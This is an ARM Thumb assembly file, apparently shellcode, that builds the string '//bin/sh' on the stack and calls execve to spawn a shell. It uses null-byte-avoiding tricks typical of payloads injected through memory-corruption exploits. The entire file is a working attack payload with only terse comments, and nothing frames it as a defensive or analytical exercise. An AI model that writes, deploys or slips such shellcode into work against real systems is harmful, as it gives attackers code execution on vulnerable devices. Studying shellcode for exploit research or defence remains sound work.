.section .text
.global _start
_start:
    .code 32
    add r3,pc , #1 @ added 1 to  switch to thumb mode
    bx r3          @branch to thumb mode
    .code 16
    eor r1,r1,r1 @ zro r1
    eor r2,r2,r2 @ zero r2
    push {r1}
    mov r0,#0x68 @ 'h'
    lsl r0 ,#8 @ shift left 8
    add r0,#0x73 @ 's'
    lsl r0 ,#8 @ shift left 8
    add r0,#0x2f @ '/'
    lsl r0 ,#8 @ shift left 8
    add r0 ,#0x6e @ 'n'
    push {r0}     @ push string onto stack
    mov r0 ,#0x69 @ 'i'
    lsl r0 ,#8 @ shift left 8
    add r0 ,#0x62 @ 'b'
    lsl r0 ,#8 @ shift left 8
    add r0 ,#0x2f @ '/'
    lsl r0 ,#8 @ shift left 8
    add r0, #0x2f @ '/'
    push {r0}     @ push string onto stack
    mov r0,sp    @ pointer to string in r0  
    mov r7,#11   @ syscall execve
    svc #1
